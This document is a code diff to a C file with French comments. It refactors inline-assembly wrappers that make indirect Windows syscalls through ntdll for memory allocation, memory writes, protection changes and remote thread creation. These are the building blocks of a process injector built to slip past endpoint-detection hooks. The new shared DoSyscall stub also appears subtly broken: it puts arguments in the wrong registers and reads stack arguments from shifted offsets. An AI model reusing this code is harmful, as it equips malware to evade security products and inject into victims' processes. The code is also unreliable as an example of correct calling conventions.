@@ -392,32 +392,51 @@ VOID CleanupIndirectSyscalls()
 }
 
 // ============================================================================
+// FONCTIONS UTILITAIRES D'AFFICHAGE
+// ============================================================================
+
+VOID PrintError(const char *function, NTSTATUS status)
+{
+    printf("[-] %s failed with status: 0x%08lX\n", function, status);
+}
+
+VOID PrintSuccess(const char *message)
+{
+    printf("[+] %s\n", message);
+}
+
+// ============================================================================
 // FONCTION ASSEMBLEUR POUR SYSCALL INDIRECT
 // ============================================================================
 
 /*
- * Cette fonction prépare les registres et jump vers l'instruction syscall
- * dans ntdll au lieu d'exécuter syscall directement
- *
- * DIFFÉRENCE AVEC SYSCALL DIRECT :
- * Direct   : syscall                     ← Instruction dans notre code
- * Indirect : jmp [syscallAddress]        ← Jump vers ntdll légitime
+ * DoSyscall - Fonction assembleur inline simplifiée
+ * 
+ * Cette fonction prépare les registres et effectue le syscall indirect
+ * 
+ * Paramètres (fastcall x64):
+ *   RCX = SSN
+ *   RDX = Adresse syscall
+ *   R8  = Argument 1
+ *   R9  = Argument 2
+ *   Stack = Arguments suivants
  */
-extern NTSTATUS DoIndirectSyscall(DWORD ssn, PVOID syscallAddress, ...);
-
-__asm__(
-    ".global DoIndirectSyscall\n"
-    "DoIndirectSyscall:\n"
-    "    mov r10, r8\n"  // R10 = 1er paramètre (R8)
-    "    mov eax, ecx\n" // EAX = SSN (RCX)
-    // RDX contient syscallAddress
-    "    mov rcx, r9\n" // Shift des paramètres
-    "    mov r8, [rsp+0x28]\n"
-    "    mov r9, [rsp+0x30]\n"
-    "    sub rsp, 0x28\n"
-    "    jmp rdx\n" // ⚠️ JUMP vers syscall dans ntdll !
-    // Pas de ret car on jump directement
-);
+__attribute__((naked))
+NTSTATUS DoSyscall(DWORD ssn, PVOID syscallAddr, ...)
+{
+    __asm__(
+        "mov r10, r8\n"        // R10 = premier argument (R8)
+        "mov eax, ecx\n"       // EAX = SSN (RCX)
+        // RDX contient déjà syscallAddr
+        "mov rcx, r9\n"        // RCX = deuxième argument (R9)
+        "mov r8, [rsp+0x28]\n" // R8 = troisième argument
+        "mov r9, [rsp+0x30]\n" // R9 = quatrième argument
+        "sub rsp, 0x28\n"      // Shadow space
+        "call rdx\n"           // Appel indirect via ntdll
+        "add rsp, 0x28\n"
+        "ret\n"
+    );
+}
 
 // ============================================================================
 // IMPLÉMENTATION DES SYSCALLS INDIRECTS
@@ -437,31 +456,17 @@ NTSTATUS NtAllocateVirtualMemory_Indirect(
     ULONG Protect)
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtAllocateVirtualMemory];
-
-    // Préparer les paramètres sur la stack
-    NTSTATUS status;
-
-    __asm__ volatile(
-        "mov r10, %1\n" // R10 = ProcessHandle
-        "mov eax, %7\n" // EAX = SSN
-        "mov rcx, %1\n"
-        "mov rdx, %2\n"
-        "mov r8, %3\n"
-        "mov r9, %4\n"
-        "push %6\n" // Protect
-        "push %5\n" // AllocationType
-        "sub rsp, 0x20\n"
-        "mov r11, %8\n" // R11 = syscallAddress
-        "call r11\n"    // ⚠️ CALL indirect via ntdll !
-        "add rsp, 0x30\n"
-        "mov %0, rax\n"
-        : "=r"(status)
-        : "r"(ProcessHandle), "r"(BaseAddress), "r"(ZeroBits),
-          "r"(RegionSize), "r"(AllocationType), "r"(Protect),
-          "r"(info->ssn), "r"(info->syscallAddress)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory");
-
-    return status;
+    
+    return DoSyscall(
+        info->ssn,
+        info->syscallAddress,
+        ProcessHandle,
+        BaseAddress,
+        ZeroBits,
+        RegionSize,
+        AllocationType,
+        Protect
+    );
 }
 
 NTSTATUS NtWriteVirtualMemory_Indirect(
@@ -473,27 +478,16 @@ NTSTATUS NtWriteVirtualMemory_Indirect(
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteVirtualMemory];
 
-    NTSTATUS status;
-    __asm__ volatile(
-        "mov r10, %1\n"
-        "mov eax, %6\n"
-        "mov rcx, %1\n"
-        "mov rdx, %2\n"
-        "mov r8, %3\n"
-        "mov r9, %4\n"
-        "push %5\n"
-        "sub rsp, 0x20\n"
-        "mov r11, %7\n"
-        "call r11\n"
-        "add rsp, 0x28\n"
-        "mov %0, rax\n"
-        : "=r"(status)
-        : "r"(ProcessHandle), "r"(BaseAddress), "r"(Buffer),
-          "r"(NumberOfBytesToWrite), "r"(NumberOfBytesWritten),
-          "r"(info->ssn), "r"(info->syscallAddress)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory");
-
-    return status;
+    return DoSyscall(
+        info->ssn,
+        info->syscallAddress,
+        ProcessHandle,
+        BaseAddress,
+        Buffer,
+        NumberOfBytesToWrite,
+        NumberOfBytesWritten,
+        0  // Padding pour alignement
+    );
 }
 
 NTSTATUS NtProtectVirtualMemory_Indirect(
@@ -505,27 +499,16 @@ NTSTATUS NtProtectVirtualMemory_Indirect(
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtProtectVirtualMemory];
 
-    NTSTATUS status;
-    __asm__ volatile(
-        "mov r10, %1\n"
-        "mov eax, %6\n"
-        "mov rcx, %1\n"
-        "mov rdx, %2\n"
-        "mov r8, %3\n"
-        "mov r9, %4\n"
-        "push %5\n"
-        "sub rsp, 0x20\n"
-        "mov r11, %7\n"
-        "call r11\n"
-        "add rsp, 0x28\n"
-        "mov %0, rax\n"
-        : "=r"(status)
-        : "r"(ProcessHandle), "r"(BaseAddress), "r"(RegionSize),
-          "r"(NewProtect), "r"(OldProtect),
-          "r"(info->ssn), "r"(info->syscallAddress)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory");
-
-    return status;
+    return DoSyscall(
+        info->ssn,
+        info->syscallAddress,
+        ProcessHandle,
+        BaseAddress,
+        RegionSize,
+        NewProtect,
+        OldProtect,
+        0  // Padding
+    );
 }
 
 NTSTATUS NtCreateThreadEx_Indirect(
@@ -543,35 +526,21 @@ NTSTATUS NtCreateThreadEx_Indirect(
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtCreateThreadEx];
 
-    NTSTATUS status;
-    __asm__ volatile(
-        "mov r10, %1\n"
-        "mov eax, %12\n"
-        "mov rcx, %1\n"
-        "mov rdx, %2\n"
-        "mov r8, %3\n"
-        "mov r9, %4\n"
-        "push %11\n"
-        "push %10\n"
-        "push %9\n"
-        "push %8\n"
-        "push %7\n"
-        "push %6\n"
-        "push %5\n"
-        "sub rsp, 0x20\n"
-        "mov r11, %13\n"
-        "call r11\n"
-        "add rsp, 0x58\n"
-        "mov %0, rax\n"
-        : "=r"(status)
-        : "r"(ThreadHandle), "r"(DesiredAccess), "r"(ObjectAttributes),
-          "r"(ProcessHandle), "r"(StartRoutine), "r"(Argument),
-          "r"(CreateFlags), "r"(ZeroBits), "r"(StackSize),
-          "r"(MaximumStackSize), "r"(AttributeList),
-          "r"(info->ssn), "r"(info->syscallAddress)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory");
-
-    return status;
+    return DoSyscall(
+        info->ssn,
+        info->syscallAddress,
+        ThreadHandle,
+        DesiredAccess,
+        ObjectAttributes,
+        ProcessHandle,
+        StartRoutine,
+        Argument,
+        CreateFlags,
+        ZeroBits,
+        StackSize,
+        MaximumStackSize,
+        AttributeList
+    );
 }
 
 NTSTATUS NtWaitForSingleObject_Indirect(
@@ -581,24 +550,14 @@ NTSTATUS NtWaitForSingleObject_Indirect(
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWaitForSingleObject];
 
-    NTSTATUS status;
-    __asm__ volatile(
-        "mov r10, %1\n"
-        "mov eax, %4\n"
-        "mov rcx, %1\n"
-        "mov rdx, %2\n"
-        "mov r8, %3\n"
-        "sub rsp, 0x20\n"
-        "mov r11, %5\n"
-        "call r11\n"
-        "add rsp, 0x20\n"
-        "mov %0, rax\n"
-        : "=r"(status)
-        : "r"(Handle), "r"((ULONG)Alertable), "r"(Timeout),
-          "r"(info->ssn), "r"(info->syscallAddress)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory");
-
-    return status;
+    return DoSyscall(
+        info->ssn,
+        info->syscallAddress,
+        Handle,
+        (PVOID)(ULONG_PTR)Alertable,
+        Timeout,
+        0, 0, 0  // Padding
+    );
 }
 
 NTSTATUS NtClose_Indirect(
@@ -606,21 +565,12 @@ NTSTATUS NtClose_Indirect(
 {
     SYSCALL_INFO *info = &g_SyscallTable[IDX_NtClose];
 
-    NTSTATUS status;
-    __asm__ volatile(
-        "mov r10, %1\n"
-        "mov eax, %2\n"
-        "mov rcx, %1\n"
-        "sub rsp, 0x20\n"
-        "mov r11, %3\n"
-        "call r11\n"
-        "add rsp, 0x20\n"
-        "mov %0, rax\n"
-        : "=r"(status)
-        : "r"(Handle), "r"(info->ssn), "r"(info->syscallAddress)
-        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory");
-
-    return status;
+    return DoSyscall(
+        info->ssn,
+        info->syscallAddress,
+        Handle,
+        0, 0, 0, 0, 0  // Padding
+    );
 }
 
 // ============================================================================
